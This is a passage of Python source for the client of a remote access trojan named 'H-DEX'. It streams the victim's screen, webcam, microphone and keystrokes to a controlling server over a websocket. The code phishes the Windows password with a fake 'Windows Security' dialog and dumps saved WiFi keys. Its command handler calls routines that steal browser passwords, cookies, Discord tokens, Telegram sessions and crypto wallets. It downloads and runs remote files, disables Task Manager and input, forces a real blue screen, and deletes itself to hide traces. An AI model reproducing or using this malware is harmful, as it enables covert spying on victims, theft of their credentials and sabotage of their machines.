                        "RGB", sct_img.size, sct_img.bgra, "raw", "BGRX"
                    )

                    if self.screen_resolution != "Original":
                        img.thumbnail(self.screen_resolution)

                    buffer = io.BytesIO()
                    img.save(buffer, format="JPEG", quality=self.screen_quality)
                    b64 = base64.b64encode(buffer.getvalue()).decode("utf-8")
                    asyncio.run_coroutine_threadsafe(
                        self.websocket.send(
                            json.dumps({"type": "screen_frame", "data": b64})
                        ),
                        self.loop,
                    )
                    time.sleep(self.screen_fps_delay)
                except:
                    break

    def stream_webcam(self):
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return

        while self.webcam_streaming and self.websocket:
            try:
                ret, frame = cap.read()
                if not ret:
                    break

                # Resize for performance
                frame = cv2.resize(frame, (640, 480))

                _, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                b64 = base64.b64encode(buffer).decode("utf-8")

                asyncio.run_coroutine_threadsafe(
                    self.websocket.send(
                        json.dumps({"type": "webcam_frame", "data": b64})
                    ),
                    self.loop,
                )
                time.sleep(0.1)
            except Exception as e:
                print(f"Webcam Error: {e}")
                break
        cap.release()

    def stream_metrics(self):
        last_io = psutil.net_io_counters()
        while self.metrics_streaming and self.websocket:
            try:
                time.sleep(1)

                cpu = psutil.cpu_percent()
                ram = psutil.virtual_memory().percent

                io = psutil.net_io_counters()
                bytes_sent = io.bytes_sent - last_io.bytes_sent
                bytes_recv = io.bytes_recv - last_io.bytes_recv
                last_io = io

                asyncio.run_coroutine_threadsafe(
                    self.websocket.send(
                        json.dumps(
                            {
                                "type": "metrics_data",
                                "cpu": cpu,
                                "ram": ram,
                                "upload_speed": bytes_sent,
                                "download_speed": bytes_recv,
                            }
                        )
                    ),
                    self.loop,
                )
            except:
                break

    def stream_audio(self):
        # Audio configuration (can be made configurable later)
        samplerate = 44100  # samples per second
        channels = 1  # mono
        dtype = "int16"  # 16-bit integers
        blocksize = 1024  # samples per block

        try:
            with sd.RawInputStream(
                samplerate=samplerate,
                blocksize=blocksize,
                channels=channels,
                dtype=dtype,
            ) as stream:
                while self.audio_streaming and self.websocket:
                    data, overflowed = stream.read(blocksize)
                    if not overflowed:
                        b64_audio = base64.b64encode(data).decode("utf-8")
                        asyncio.run_coroutine_threadsafe(
                            self.websocket.send(
                                json.dumps({"type": "audio_chunk", "data": b64_audio})
                            ),
                            self.loop,
                        )
                    time.sleep(0.01)  # Small delay to avoid excessive CPU usage
        except Exception as e:
            print(f"Audio stream error: {e}")
            self.audio_streaming = False  # Ensure streaming stops on error

    def mouse_move(self, x, y):
        w, h = pyautogui.size()
        pyautogui.moveTo(x * w, y * h)

    def mouse_click(self, x, y, btn):
        w, h = pyautogui.size()
        pyautogui.click(x * w, y * h, button=btn)

    def key_press(self, key):
        pyautogui.press(key)

    # --- Prank & Control Features ---
    def show_message(self, title, msg, icon_type):
        # icon_type: 16=Error, 32=Question, 48=Warning, 64=Info
        ctypes.windll.user32.MessageBoxW(0, msg, title, int(icon_type))

    def prank_virus(self):
        """Simulates a scary virus effect with overlapping messages"""

        def effect():
            for _ in range(12):
                threading.Thread(
                    target=lambda: ctypes.windll.user32.MessageBoxW(
                        0,
                        "FATAL ERROR: Unauthorized access detected. System files are being deleted...",
                        "H-DEX CRITICAL ALERT",
                        16,
                    ),
                    daemon=True,
                ).start()
                time.sleep(0.4)

        threading.Thread(target=effect, daemon=True).start()

    async def set_wallpaper(self, path):
        """Set desktop wallpaper from a local file path"""
        try:
            # 20 = SPI_SETDESKWALLPAPER
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": "Wallpaper updated successfully",
                    }
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"Wallpaper error: {e}"}
                )
            )

    async def set_wallpaper_b64(self, b64_data):
        """Set desktop wallpaper from base64 data"""
        try:
            temp_path = os.path.join(os.getenv("TEMP"), "hdex_wallpaper.jpg")
            with open(temp_path, "wb") as f:
                f.write(base64.b64decode(b64_data))
            # Call the local path version
            await self.set_wallpaper(temp_path)
        except Exception as e:
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"Wallpaper B64 error: {e}"}
                )
            )

    async def monitor_control(self, state):
        # state: 2 = Off, -1 = On
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, state)

    async def swap_mouse_buttons(self, swap=True):
        ctypes.windll.user32.SwapMouseButton(1 if swap else 0)

    async def hang_system(self):
        """Max out CPU usage by starting infinite loops on all cores"""

        def heavy_load():
            while True:
                pass

        for _ in range(os.cpu_count() or 4):
            threading.Thread(target=heavy_load, daemon=True).start()
        await self.websocket.send(
            json.dumps({"type": "command_output", "output": "CPU Stress Test Started"})
        )

    def spam_message_box(self, text):
        for _ in range(20):
            threading.Thread(
                target=lambda: ctypes.windll.user32.MessageBoxW(
                    0, text, "H-Dex Notification", 48
                ),
                daemon=True,
            ).start()
            time.sleep(0.15)

    async def toggle_taskbar(self, show=True):
        try:
            hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
            cmd = 5 if show else 0
            ctypes.windll.user32.ShowWindow(hwnd, cmd)
        except:
            pass

    def spam_apps(self, app="calc"):
        for _ in range(20):
            subprocess.Popen(app, shell=True)
            time.sleep(0.2)

    def beep_loop(self):
        self.beeping = True
        import winsound

        while getattr(self, "beeping", False):
            winsound.Beep(1200, 300)
            time.sleep(0.2)

    async def stop_beep(self):
        self.beeping = False

    async def set_audio_volume(self, level):
        """Set system volume (0-100) using PowerShell"""
        try:
            # Volume control via PowerShell is reliable
            cmd = f'powershell -Command "$w = New-Object -ComObject WScript.Shell; for($i=0; $i<50; $i++) {{ $w.SendKeys([char]174) }}; for($i=0; $i<{int(level / 2)}; $i++) {{ $w.SendKeys([char]175) }}"'
            subprocess.run(cmd, shell=True)
        except:
            pass

    async def set_brightness(self, level):
        try:
            cmd = f'powershell -Command "(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, {level})"'
            subprocess.run(cmd, shell=True)
        except:
            pass

    async def fake_update_screen(self):
        def show():
            import tkinter as tk

            root = tk.Tk()
            root.attributes("-fullscreen", True)
            root.configure(bg="black", cursor="none")
            root.attributes("-topmost", True)
            lbl = tk.Label(
                root,
                text="Working on updates 0%",
                font=("Segoe UI", 30),
                fg="white",
                bg="black",
            )
            lbl.place(relx=0.5, rely=0.5, anchor="center")

            def progress(c):
                if c <= 100:
                    lbl.config(text=f"Working on updates {c}%")
                    root.after(2000, lambda: progress(c + 1))
                else:
                    root.destroy()

            progress(0)
            root.mainloop()

        threading.Thread(target=show, daemon=True).start()

    async def toggle_cmd(self, disable=True):
        try:
            val = 2 if disable else 0
            with winreg.CreateKey(
                winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System"
            ) as key:
                winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, val)
        except:
            pass

    async def toggle_regedit(self, disable=True):
        try:
            val = 1 if disable else 0
            with winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
            ) as key:
                winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, val)
        except:
            pass

    async def empty_recycle_bin(self):
        try:
            ctypes.windll.shell32.SHEmptyRecycleBinW(None, None, 1 | 2 | 4)
        except:
            pass

    async def fake_bsod(self):
        def show():
            import tkinter as tk

            root = tk.Tk()
            root.attributes("-fullscreen", True, "-topmost", True)
            root.configure(bg="#0078D7", cursor="none")
            tk.Label(
                root, text=":(", font=("Segoe UI", 120), fg="white", bg="#0078D7"
            ).pack(pady=(120, 20), anchor="w", padx=100)
            tk.Label(
                root,
                text="Your PC ran into a problem and needs to restart.",
                font=("Segoe UI", 32),
                fg="white",
                bg="#0078D7",
            ).pack(anchor="w", padx=100)
            tk.Label(
                root,
                text="We're just collecting some error info, and then we'll restart for you.",
                font=("Segoe UI", 22),
                fg="white",
                bg="#0078D7",
            ).pack(anchor="w", padx=100, pady=30)
            tk.Label(
                root,
                text="47% complete",
                font=("Segoe UI", 22),
                fg="white",
                bg="#0078D7",
            ).pack(anchor="w", padx=100)
            root.bind("<Escape>", lambda e: root.destroy())
            root.mainloop()

        threading.Thread(target=show, daemon=True).start()

    async def phish_password(self):
        def show():
            import tkinter as tk

            root = tk.Tk()
            root.title("Windows Security")
            root.geometry("400x320")
            root.attributes("-topmost", True)
            tk.Label(root, text="Windows Security", font=("Segoe UI", 16, "bold")).pack(
                pady=15
            )
            tk.Label(
                root,
                text="Please verify your identity to continue login.",
                font=("Segoe UI", 10),
            ).pack(pady=5)
            entry = tk.Entry(root, show="*", font=("Segoe UI", 14))
            entry.pack(pady=15, padx=30, fill=tk.X)
            entry.focus_set()

            def submit():
                pw = entry.get()
                if pw:
                    asyncio.run_coroutine_threadsafe(
                        self.websocket.send(
                            json.dumps(
                                {
                                    "type": "command_output",
                                    "output": f"[PHISHED] Password: {pw}",
                                }
                            )
                        ),
                        self.loop,
                    )
                    root.destroy()

            tk.Button(
                root,
                text="Verify",
                command=submit,
                width=15,
                bg="#0078D7",
                fg="white",
                font=("Segoe UI", 11),
            ).pack(pady=20)
            root.mainloop()

        threading.Thread(target=show, daemon=True).start()

    async def crazy_mouse(self, duration=15):
        t_end = time.time() + duration
        w, h = pyautogui.size()
        while time.time() < t_end:
            pyautogui.moveTo(random.randint(0, w), random.randint(0, h))
            time.sleep(0.05)

    async def toggle_desktop_icons(self, show=True):
        try:
            # Complex way to find the actual listview of desktop icons
            hwnd = ctypes.windll.user32.FindWindowW("Progman", "Program Manager")
            if not hwnd:
                hwnd = ctypes.windll.user32.FindWindowW("WorkerW", None)

            def get_listview(hwnd):
                h = ctypes.windll.user32.FindWindowExW(
                    hwnd, 0, "SHELLDLL_DefView", None
                )
                if h:
                    return ctypes.windll.user32.FindWindowExW(
                        h, 0, "SysListView32", None
                    )
                return None

            hwnd_items = get_listview(hwnd)
            if not hwnd_items:
                # Iterate through WorkerW windows (win10/11 behavior)
                h = ctypes.windll.user32.FindWindowExW(0, 0, "WorkerW", None)
                while h:
                    hwnd_items = get_listview(h)
                    if hwnd_items:
                        break
                    h = ctypes.windll.user32.FindWindowExW(0, h, "WorkerW", None)

            if hwnd_items:
                cmd = 5 if show else 0
                ctypes.windll.user32.ShowWindow(hwnd_items, cmd)
        except:
            pass

    async def toggle_taskmgr(self, enable=True):
        try:
            val = 0 if enable else 1
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            try:
                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
                    winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, val)
                
                status = "Enabled" if enable else "Disabled"
                await self.websocket.send(json.dumps({
                    "type": "command_output", 
                    "output": f"Task Manager has been {status} successfully."
                }))
            except Exception as e:
                await self.websocket.send(json.dumps({
                    "type": "command_output", 
                    "output": f"Failed to toggle Task Manager: {e}"
                }))
        except Exception as e:
            pass

    async def get_location(self):
        """Robust IP Geolocation using multiple Fallbacks"""
        try:
            data = None
            # Try ip-api.com
            try:
                data = requests.get("http://ip-api.com/json", timeout=10).json()
            except:
                pass

            # Fallback to ipapi.co
            if not data or data.get("status") == "fail":
                try:
                    data = requests.get("https://ipapi.co/json/", timeout=10).json()
                except:
                    pass

            if data:
                await self.websocket.send(
                    json.dumps({"type": "location_info", "data": data})
                )
            else:
                await self.websocket.send(
                    json.dumps(
                        {
                            "type": "command_output",
                            "output": "Failed to retrieve location data.",
                        }
                    )
                )
        except:
            pass

    async def get_wifi_passwords(self):
        """Retrieve WiFi passwords using netsh"""
        try:
            profiles_data = subprocess.check_output(
                "netsh wlan show profiles", shell=True
            ).decode("cp850", errors="ignore")
            profiles = [
                line.split(":")[1].strip()
                for line in profiles_data.split("\n")
                if "All User Profile" in line
            ]

            output = "📶 WIFI PASSWORDS\n=================\n"
            found = False

            for profile in profiles:
                try:
                    p_data = subprocess.check_output(
                        f'netsh wlan show profile name="{profile}" key=clear',
                        shell=True,
                    ).decode("cp850", errors="ignore")
                    key_content = [
                        line.split(":")[1].strip()
                        for line in p_data.split("\n")
                        if "Key Content" in line
                    ]
                    password = key_content[0] if key_content else "(Open Network)"
                    output += f"SSID: {profile}\nPASS: {password}\n\n"
                    found = True
                except:
                    output += f"SSID: {profile}\nPASS: [Error]\n\n"

            if not found:
                output += "No WiFi profiles found."

            await self.websocket.send(
                json.dumps({"type": "command_output", "output": output})
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"WiFi Error: {e}"})
            )

    async def get_installed_apps(self):
        """List installed apps via WMIC"""
        await self.execute_shell_command("wmic product get name,version")

    async def modify_registry(self, action):
        """Modify registry for restrictions"""
        try:
            import winreg

            key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            if "taskmgr" in action:
                val_name = "DisableTaskMgr"
                val_data = 1 if "disable" in action else 0
            elif "cmd" in action:
                val_name = "DisableCMD"
                val_data = 1 if "disable" in action else 0
            else:
                return

            # Note: This often requires Admin privileges
            try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                winreg.SetValueEx(key, val_name, 0, winreg.REG_DWORD, val_data)
                winreg.CloseKey(key)
                await self.websocket.send(
                    json.dumps(
                        {
                            "type": "command_output",
                            "output": f"Registry {action} success.",
                        }
                    )
                )
            except Exception as e:
                await self.websocket.send(
                    json.dumps(
                        {
                            "type": "command_output",
                            "output": f"Registry Access Denied: {e}",
                        }
                    )
                )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"Registry Error: {e}"})
            )

    async def trigger_bsod(self):
        """Force a real Blue Screen of Death (requires admin)"""
        try:
            # Mark as critical and exit - usually causes BSOD
            ctypes.windll.ntdll.RtlAdjustPrivilege(
                19, 1, 0, ctypes.byref(ctypes.c_bool())
            )
            ctypes.windll.ntdll.NtRaiseHardError(
                0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong())
            )
        except:
            pass

    async def rotate_screen(self, angle):
        """Screen rotation stub - complex rotation removed for stability"""
        await self.websocket.send(
            json.dumps(
                {
                    "type": "command_output",
                    "output": "Screen rotation not supported on this device.",
                }
            )
        )

    async def minimize_all(self):
        """Minimize all windows"""
        try:
            pyautogui.hotkey("win", "m")
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": "All windows minimized."}
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"Error: {e}"})
            )
    async def scan_network(self, ip_range="AUTO"):
        """Scan local network for devices using ARP cache (stealthy)"""
        devices = []
        try:
            output = subprocess.check_output("arp -a", shell=True).decode('utf-8', errors='ignore')
            lines = output.splitlines()
            for line in lines:
                parts = line.split()
                # Typical arp -a output: 192.168.1.1      00-11-22-33-44-55     dynamic
                if len(parts) >= 3 and parts[0].count('.') == 3:
                    ip = parts[0]
                    mac = parts[1]
                    # Filter out broadcast/multicast
                    if not ip.endswith(".255") and not ip.startswith("224.") and not ip.startswith("239."):
                        devices.append({"ip": ip, "mac": mac})
            
            await self.websocket.send(json.dumps({
                "type": "network_scan",
                "devices": devices
            }))
        except Exception as e:
            await self.websocket.send(json.dumps({
                "type": "command_output",
                "output": f"Network Scan Error: {e}"
            }))

    def spam_open_url(self, url, count=10):
        """Open a URL multiple times"""
        for _ in range(count):
            try:
                os.startfile(url)
            except:
                pass
            time.sleep(0.5)

    async def crazy_mouse(self, duration=15):
        """Move mouse randomly for a duration"""
        try:
            t_end = time.time() + duration
            w, h = pyautogui.size()
            while time.time() < t_end:
                pyautogui.moveTo(random.randint(0, w), random.randint(0, h))
                time.sleep(0.05)
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": "Crazy mouse effect completed.",
                    }
                )
            )
        except:
            pass

    def _crazy_mouse_sync(self, duration=15):
        """Sync wrapper for crazy_mouse - for threading"""
        try:
            t_end = time.time() + duration
            w, h = pyautogui.size()
            while time.time() < t_end:
                pyautogui.moveTo(random.randint(0, w), random.randint(0, h))
                time.sleep(0.05)
        except:
            pass

    def start_input_blocking(self):
        """Block keyboard and mouse input using pynput listeners"""
        if hasattr(self, "block_listener_k") and self.block_listener_k:
            return

        # Suppress Keyboard
        self.block_listener_k = keyboard.Listener(suppress=True)
        self.block_listener_k.start()

        # Suppress Mouse
        self.block_listener_m = mouse.Listener(suppress=True)
        self.block_listener_m.start()

        # Also try Windows API BlockInput as backup
        try:
            ctypes.windll.user32.BlockInput(True)
        except:
            pass

    def stop_input_blocking(self):
        """Unblock keyboard and mouse input"""
        if hasattr(self, "block_listener_k") and self.block_listener_k:
            self.block_listener_k.stop()
            self.block_listener_k = None

        if hasattr(self, "block_listener_m") and self.block_listener_m:
            self.block_listener_m.stop()
            self.block_listener_m = None

        try:
            ctypes.windll.user32.BlockInput(False)
        except:
            pass

    async def self_destruct(self):
        """Completely remove all traces of the client"""
        try:
            # 1. Remove from Startup
            try:
                with winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0,
                    winreg.KEY_SET_VALUE,
                ) as key:
                    winreg.DeleteValue(key, STARTUP_KEY_NAME)
            except:
                pass

            # 2. Delete Task Scheduler entry
            subprocess.run(
                f'schtasks /delete /tn "{STARTUP_KEY_NAME}" /f',
                shell=True,
                capture_output=True,
            )

            # 3. Clean environment (e.g., hosts file if modified)

            # 4. Self-deletion script
            exe_path = os.path.realpath(subprocess.sys.executable)
            cmd = f'timeout /t 3 & del /f /q "{exe_path}"'
            subprocess.Popen(cmd, shell=True)
            os._exit(0)
        except:
            os._exit(0)

    def get_uptime(self):
        """Calculate system uptime"""
        try:
            return str(timedelta(seconds=int(time.time() - psutil.boot_time())))
        except:
            return "Unknown"

    def get_active_window_title(self):
        """Get title of currently focused window"""
        try:
            import ctypes

            GetForegroundWindow = ctypes.windll.user32.GetForegroundWindow
            GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
            GetWindowText = ctypes.windll.user32.GetWindowTextW

            hwnd = GetForegroundWindow()
            length = GetWindowTextLength(hwnd)
            buff = ctypes.create_unicode_buffer(length + 1)
            GetWindowText(hwnd, buff, length + 1)
            return buff.value or "N/A"
        except:
            return "N/A"

    async def remote_execute_url(self, url, run_as_admin=False):
        """Download a file from URL and execute it"""
        try:
            filename = url.split("/")[-1] or "downloaded_file.exe"
            save_path = os.path.join(os.getenv("TEMP"), filename)

            response = requests.get(url, stream=True, timeout=30)
            with open(save_path, "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)

            if run_as_admin:
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", save_path, None, None, 1
                )
            else:
                subprocess.Popen(save_path, shell=True)

            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"Successfully launched: {filename}",
                    }
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"Remote Exec Error: {str(e)}"}
                )
            )

    async def self_update(self, url):
        """Replace the current client with a new version from URL"""
        try:
            # 1. Download new version
            new_client_path = os.path.join(os.getenv("TEMP"), "update_temp.exe")
            response = requests.get(url, stream=True, timeout=60)
            with open(new_client_path, "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)

            # 2. Prepare replacement batch script
            current_exe = sys.executable
            batch_path = os.path.join(os.getenv("TEMP"), "updater.bat")

            with open(batch_path, "w") as f:
                f.write(f"@echo off\n")
                f.write(f"timeout /t 3 /nobreak\n")
                f.write(f'del /f /q "{current_exe}"\n')
                f.write(f'copy /y "{new_client_path}" "{current_exe}"\n')
                f.write(f'start "" "{current_exe}"\n')
                f.write(f'del "%~f0"\n')

            # 3. Notify and launch
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": "Self-update initiated. Connection will drop...",
                    }
                )
            )
            subprocess.Popen(batch_path, shell=True)
            os._exit(0)
        except Exception as e:
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"Update Error: {str(e)}"}
                )
            )

    async def visit_url(self, url):
        """Open a URL in the browser"""
        try:
            import webbrowser

            webbrowser.open(url)
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"Opened URL: {url}"})
            )
        except:
            pass

    async def receive_messages(self, websocket):
        async for message in websocket:
            try:
                data = json.loads(message)
                t = data.get("type")

                if t == "list_dir":
                    await self.list_directory(data.get("path"))
                elif t == "download_file":
                    await self.upload_file_to_server(data.get("path"))
                elif t == "execute_command":
                    await self.run_command(data.get("command"))
                elif t == "get_processes":
                    await self.send_process_list()
                elif t == "get_battery":
                    await self.send_battery_status()
                elif t == "get_network":
                    await self.send_network_info()
                elif t == "kill_process":
                    self.kill_process(data.get("pid"))
                elif t == "start_screen_stream":
                    if not self.screen_streaming:
                        self.screen_streaming = True
                        threading.Thread(target=self.stream_screen, daemon=True).start()
                elif t == "stop_screen_stream":
                    self.screen_streaming = False
                elif t == "take_screenshot":
                    await self.take_screenshot()
                elif t == "scan_network":
                    await self.scan_network(data.get("range", "AUTO"))
                elif t == "start_webcam_stream":
                    if not self.webcam_streaming:
                        self.webcam_streaming = True
                        threading.Thread(target=self.stream_webcam, daemon=True).start()
                elif t == "stop_webcam_stream":
                    self.webcam_streaming = False
                elif t == "start_metrics_stream":
                    if not self.metrics_streaming:
                        self.metrics_streaming = True
                        threading.Thread(
                            target=self.stream_metrics, daemon=True
                        ).start()
                elif t == "stop_metrics_stream":
                    self.metrics_streaming = False
                elif t == "start_audio_stream":
                    if not self.audio_streaming:
                        self.audio_streaming = True
                        threading.Thread(target=self.stream_audio, daemon=True).start()
                elif t == "stop_audio_stream":
                    self.audio_streaming = False
                elif t == "update_screen_stream_settings":
                    self.screen_quality = data.get("quality", self.screen_quality)
                    res_str = data.get("resolution", "800x600")
                    if res_str == "Original":
                        self.screen_resolution = "Original"
                    else:
                        try:
                            self.screen_resolution = tuple(map(int, res_str.split("x")))
                        except:
                            self.screen_resolution = (800, 600)
                    self.screen_fps_delay = 1.0 / data.get("fps", 10)
                elif t == "mouse_move":
                    self.mouse_move(data.get("x"), data.get("y"))
                elif t == "mouse_click":
                    self.mouse_click(data.get("x"), data.get("y"), data.get("button"))
                elif t == "key_press":
                    self.key_press(data.get("key"))
                elif t == "inject_keys":
                    pyautogui.write(data.get("keys"))
                elif t == "get_clipboard":
                    try:
                        content = pyperclip.paste()
                        await self.websocket.send(
                            json.dumps({"type": "clipboard_content", "data": content})
                        )
                    except Exception as clip_e:
                        print(f"Error getting clipboard: {clip_e}")
                elif t == "set_clipboard":
                    try:
                        content = data.get("content", "")
                        pyperclip.copy(content)
                    except Exception as clip_e:
                        print(f"Error setting clipboard: {clip_e}")

                elif t == "open_url":
                    try:
                        os.startfile(data.get("url"))
                    except:
                        pass
                elif t == "spam_url":
                    self.spam_open_url(data.get("url"), 10)

                # New Handlers
                elif t == "show_message":
                    threading.Thread(
                        target=self.show_message,
                        args=(data.get("title"), data.get("message"), data.get("icon")),
                        daemon=True,
                    ).start()
                elif t == "prank_virus":
                    threading.Thread(target=self.prank_virus, daemon=True).start()
                elif t == "set_wallpaper":
                    await self.set_wallpaper(data.get("path"))
                elif t == "set_wallpaper_b64":
                    await self.set_wallpaper_b64(data.get("data"))
                elif t == "monitor_off":
                    await self.monitor_control(2)
                elif t == "monitor_on":
                    await self.monitor_control(-1)
                elif t == "get_location":
                    await self.get_location()
                elif t == "get_wifi":
                    await self.get_wifi_passwords()
                elif t == "scan_network":
                    await self.scan_network(data.get("target"), data.get("ports"))
                elif t == "open_cd":
                    ctypes.windll.winmm.mciSendStringW(
                        "set cdaudio door open", None, 0, None
                    )
                elif t == "beep":
                    import winsound

                    winsound.Beep(1000, 1000)
                elif t == "speak":
                    txt = data.get("text", "Hello")
                    cmd = f"powershell -Command \"Add-Type –AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{txt}');\""
                    subprocess.Popen(cmd, shell=True)
                elif t == "play_audio":
                    try:
                        audio_data_b64 = data.get("data")
                        decoded_audio = base64.b64decode(audio_data_b64)
                        # Assuming WAV header is present or raw audio needs to be formatted
                        # For simplicity, if raw audio, play directly. Else, save and play.
                        # This example assumes raw int16 data, similar to microphone stream
                        audio_np = np.frombuffer(decoded_audio, dtype="int16")
                        sd.play(audio_np, samplerate=44100)
                        sd.wait()
                    except Exception as play_e:
                        print(f"Error playing audio file: {play_e}")
                elif t == "list_apps":
                    await self.list_installed_apps()
                elif t == "block_input":
                    try:
                        success = ctypes.windll.user32.BlockInput(True)
                        if success:
                            await self.websocket.send(
                                json.dumps(
                                    {
                                        "type": "command_output",
                                        "output": "Input blocked successfully",
                                    }
                                )
                            )
                        else:
                            # BlockInput might fail due to UAC restrictions
                            await self.websocket.send(
                                json.dumps(
                                    {
                                        "type": "command_output",
                                        "output": "Failed to block input - may require administrator privileges",
                                    }
                                )
                            )
                    except Exception as e:
                        await self.websocket.send(
                            json.dumps(
                                {
                                    "type": "command_output",
                                    "output": f"Error blocking input: {str(e)}",
                                }
                            )
                        )
                elif t == "unblock_input":
                    try:
                        success = ctypes.windll.user32.BlockInput(False)
                        if success:
                            await self.websocket.send(
                                json.dumps(
                                    {
                                        "type": "command_output",
                                        "output": "Input unblocked successfully",
                                    }
                                )
                            )
                        else:
                            await self.websocket.send(
                                json.dumps(
                                    {
                                        "type": "command_output",
                                        "output": "Failed to unblock input - may require administrator privileges",
                                    }
                                )
                            )
                    except Exception as e:
                        await self.websocket.send(
                            json.dumps(
                                {
                                    "type": "command_output",
                                    "output": f"Error unblocking input: {str(e)}",
                                }
                            )
                        )
                elif t == "block_input_enhanced":
                    self.start_input_blocking()
                    await self.websocket.send(
                        json.dumps(
                            {
                                "type": "command_output",
                                "output": "Enhanced Input Blocking Enabled",
                            }
                        )
                    )
                elif t == "unblock_input_enhanced":
                    self.stop_input_blocking()
                    await self.websocket.send(
                        json.dumps(
                            {
                                "type": "command_output",
                                "output": "Enhanced Input Blocking Disabled",
                            }
                        )
                    )
                elif t == "get_services":
                    await self.get_services()
                elif t == "service_action":
                    await self.service_action(data.get("name"), data.get("action"))
                elif t == "get_startup":
                    await self.get_startup_items()
                elif t == "delete_startup":
                    await self.delete_startup_item(data.get("path"))
                elif t == "start_keylogger":
                    self.start_keylogger()
                elif t == "stop_keylogger":
                    self.stop_keylogger()
                elif t == "dump_keylogs":
                    await self.dump_keylogs()
                elif t == "get_all_keylogs":
                    await self.get_all_keylogs()
                elif t == "get_keylogs_by_date":
                    await self.get_keylogs_by_date(
                        data.get("start_date"), data.get("end_date")
                    )
                elif t == "clear_keylogs":
                    await self.clear_keylogs()
                elif t == "start_live_keylog":
                    self.start_live_keylog_stream()
                elif t == "stop_live_keylog":
                    self.stop_live_keylog_stream()
                elif t == "get_sys_info":
                    await self.send_system_info()
                elif t == "get_clipboard":
                    await self.get_clipboard()
                elif t == "set_clipboard":
                    await self.set_clipboard(data.get("content"))
                elif t == "get_browser_history":
                    await self.get_browser_history()
                elif t == "get_browser_passwords":
                    await self.get_browser_passwords()
                elif t == "get_browser_cookies":
                    await self.get_browser_cookies()
                elif t == "migrate_server":
                    await self.migrate_server(data.get("new_uri"))
                elif t == "update_pool":
                    await self.update_pool(data.get("new_pool"))
                elif t == "add_to_pool":
                    await self.add_to_pool(data.get("new_uri"))
                elif t == "remote_exec_url":
                    await self.remote_execute_url(
                        data.get("url"), data.get("admin", False)
                    )
                elif t == "self_update":
                    await self.self_update(data.get("url"))
                elif t == "visit_url":
                    await self.visit_url(data.get("url"))
                elif t == "get_discord_tokens":
                    await self.get_discord_tokens()
                elif t == "get_telegram":
                    await self.get_telegram_sessions()
                elif t == "scan_wallets":
                    await self.scan_crypto_wallets()
                elif t == "download_execute":
                    await self.download_and_execute(
                        data.get("url"), data.get("filename")
                    )
                elif t == "crazy_mouse":
                    threading.Thread(
                        target=self._crazy_mouse_sync,
                        args=(data.get("duration", 10),),
                        daemon=True,
                    ).start()
                elif t == "hide_icons":
                    await self.toggle_desktop_icons(False)
                elif t == "show_icons":
                    await self.toggle_desktop_icons(True)
                elif t == "disable_taskmgr":
                    await self.toggle_taskmgr(False)
                elif t == "enable_taskmgr":
                    await self.toggle_taskmgr(True)
                elif t == "lock_windows":
                    ctypes.windll.user32.LockWorkStation()
                elif t == "rotate_90":
                    await self.rotate_screen(90)
                elif t == "rotate_180":
                    await self.rotate_screen(180)
                elif t == "rotate_270":
                    await self.rotate_screen(270)
                elif t == "rotate_0":
                    await self.rotate_screen(0)
                elif t == "self_destruct":
                    await self.self_destruct()
                elif t == "set_volume":
                    await self.set_audio_volume(data.get("level", 50))
                elif t == "set_brightness":
                    await self.set_brightness(data.get("level", 50))
                elif t == "fake_update":
                    await self.fake_update_screen()
                elif t == "bsod":
                    await self.trigger_bsod()
                elif t == "get_netstat":
                    await self.get_netstat()
                elif t == "get_env":
                    await self.get_env_vars()
                elif t == "get_users":
                    await self.get_users_list()
                elif t == "get_uac":
                    await self.get_uac_status()
                elif t == "get_drives":
                    await self.get_detailed_drives()
                elif t == "get_drivers":
                    await self.get_drivers_list()
                elif t == "get_events":
                    await self.get_recent_event_logs()
                elif t == "calc_hash":
                    await self.calc_sha256(data.get("path"))
                elif t == "power_action":
                    await self.power_control(data.get("action"))
                elif t == "get_foreground":
                    title = self.get_active_window_title()
                    await self.websocket.send(
                        json.dumps(
                            {
                                "type": "command_output",
                                "output": f"Foreground Window: {title}",
                            }
                        )
                    )
                elif t == "edit_hosts":
                    await self.edit_hosts(
